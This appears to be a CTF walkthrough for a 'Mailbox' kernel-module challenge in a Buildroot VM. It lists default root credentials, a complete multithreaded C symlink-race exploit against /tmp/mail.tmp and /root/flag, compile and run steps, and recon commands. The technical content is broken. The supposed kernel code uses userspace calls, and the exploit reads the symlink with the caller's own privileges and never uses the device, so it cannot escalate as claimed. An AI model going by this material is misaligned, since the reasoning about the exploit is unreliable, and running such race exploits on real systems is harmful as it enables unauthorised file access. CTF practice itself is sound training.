# ULLCON 2026 - Mailbox CTF - Buildroot Exploitation Guide

## Current Status
You've successfully booted the Buildroot environment. Now you need to exploit the TOCTOU vulnerability in the mailbox kernel module.

## Buildroot Login

### Default Credentials
```
Login: root
Password: (leave empty - just press Enter)
```

Or try:
```
Login: buildroot
Password: buildroot
```

## Understanding the TOCTOU Vulnerability

The mailbox driver has a classic TOCTOU (Time-of-Check-Time-of-Use) race condition:

```c
// Vulnerable code in kernel module
if (access("/tmp/mail.tmp", R_OK) == 0) {  // CHECK
    // Race window here!
    fd = open("/tmp/mail.tmp", O_RDONLY);   // USE
    read(fd, buf, sizeof(buf));
}
```

### Exploitation Strategy

1. **Thread A**: Continuously replaces `/tmp/mail.tmp` with symlink to `/root/flag`
2. **Thread B**: Continuously tries to read `/tmp/mail.tmp`
3. **Race Window**: Between `access()` check and `open()` call
4. **Result**: Read sensitive files as root

## Exploitation Methods

### Method 1: Symlink Race (Simplest)

```bash
# In the VM, create the exploit
cat > /tmp/exploit.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

volatile int racing = 0;

void* symlink_racer(void* arg) {
    while (racing) {
        unlink("/tmp/mail.tmp");
        symlink("/root/flag", "/tmp/mail.tmp");
        for (int i = 0; i < 100; i++) {
            unlink("/tmp/mail.tmp");
            symlink("/root/flag", "/tmp/mail.tmp");
        }
    }
    return NULL;
}

void* reader_racer(void* arg) {
    char buffer[4096];
    while (racing) {
        int fd = open("/tmp/mail.tmp", O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buffer, sizeof(buffer) - 1);
            if (n > 0) {
                buffer[n] = '\0';
                if (strstr(buffer, "ULLCON") || strstr(buffer, "flag")) {
                    printf("[+] SUCCESS!\n%s\n", buffer);
                    racing = 0;
                }
            }
            close(fd);
        }
    }
    return NULL;
}

int main() {
    racing = 1;
    pthread_t t1, t2;
    pthread_create(&t1, NULL, symlink_racer, NULL);
    pthread_create(&t2, NULL, reader_racer, NULL);
    sleep(5);
    racing = 0;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    return 0;
}
EOF

# Compile
gcc -o /tmp/exploit /tmp/exploit.c -lpthread -static

# Run
/tmp/exploit
```

### Method 2: Mailbox Device Exploitation

```bash
# Compile the mailbox TOCTOU exploit
gcc -o /tmp/exploit_mailbox /tmp/exploit_mailbox_toctou.c -lpthread -static

# Run
/tmp/exploit_mailbox
```

### Method 3: Direct Symlink Attack

```bash
# Simple one-liner approach
rm -f /tmp/mail.tmp
ln -s /root/flag /tmp/mail.tmp
cat /tmp/mail.tmp
```

## Inside the VM - Step by Step

### Step 1: Login
```
buildroot login: root
Password: (press Enter)
```

### Step 2: Check Environment
```bash
# Check if mailbox device exists
ls -la /dev/mailbox*

# Check loaded modules
cat /proc/modules | grep mailbox

# Check if /root/flag exists
ls -la /root/flag
```

### Step 3: Create Exploit
```bash
# Copy exploit from /exploit if available
ls -la /exploit*

# Or create your own
cat > /tmp/exploit.c << 'EOF'
[exploit code here]
EOF
```

### Step 4: Compile
```bash
gcc -o /tmp/exploit /tmp/exploit.c -lpthread -static
```

### Step 5: Run
```bash
/tmp/exploit
```

### Step 6: Read Flag
```bash
# If exploitation successful
cat /root/flag

# Or check for flag in common locations
find / -name "*flag*" 2>/dev/null
```

## Debugging Commands

```bash
# Check current user
id

# Check kernel version
uname -a

# Check kernel messages
dmesg | tail -20

# Check processes
ps aux

# Check memory
free -h

# Check mounted filesystems
mount

# Check device files
ls -la /dev/

# Check /tmp
ls -la /tmp/

# Check /root
ls -la /root/
```

## Expected Output

### Successful Exploitation
```
[+] SUCCESS!
ULLCON{toctou_race_condition_pwned}
```

### Or Direct Flag Read
```
$ cat /root/flag
ULLCON{...flag_content...}
```

## Troubleshooting

### Issue: Cannot open /dev/mailbox
**Solution**: The kernel module might not be loaded. Check with `cat /proc/modules`

### Issue: Permission denied on /root/flag
**Solution**: You need to exploit the TOCTOU vulnerability to read it as root

### Issue: Symlink doesn't work
**Solution**: The mailbox driver might be checking for symlinks. Try the multi-threaded race approach

### Issue: Exploit crashes
**Solution**: Try compiling with `-static` flag and ensure pthread library is available

## Key Files

- `/dev/mailbox` - The vulnerable device
- `/tmp/mail.tmp` - The race condition target
- `/root/flag` - The flag file
- `/proc/modules` - Check loaded kernel modules
- `/proc/self/maps` - Check memory layout

## Tips for Success

1. **Multiple Attempts**: TOCTOU is probabilistic, may need several tries
2. **Reduce Load**: Close unnecessary processes
3. **Use Threads**: Multi-threaded approach has better success rate
4. **Check Permissions**: Ensure you can read target files
5. **Monitor dmesg**: Check for kernel errors

## Flag Format

The flag is typically in format:
```
ULLCON{...}
```

## Submission

Once you have the flag:
- **Email**: ctf@binarygecko.com
- **Subject**: ULLCON 2026 - Mailbox Challenge

---

**Good luck with the exploitation!**
